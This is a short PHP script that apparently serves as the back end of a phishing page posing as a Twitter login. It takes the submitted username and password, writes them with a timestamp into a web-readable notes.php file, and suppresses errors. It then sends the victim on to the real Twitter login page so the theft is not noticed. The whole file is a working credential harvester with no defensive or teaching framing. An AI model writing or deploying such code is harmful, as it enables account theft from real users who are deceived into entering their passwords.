<?php

error_reporting(0);

$username = $_POST['username'];
$password = $_POST['password'];
$date = date("Y-m-d;h:i:s");

if ((empty($_POST["username"])) || (empty($_POST["password"]))) {
    header('location: index.php');
    }
    else
    {
        

        $f = fopen("notes.php", "a");
        
        fwrite ($f,
            'Username: <b>'.$username.'</b><br>
            Password: <b>'.$password.'</b><br>
            Date: <b>'.$date.'</b><br>');
            
        
        fclose($f);
        
        header("location: https://twitter.com/i/flow/login/");

    }

?>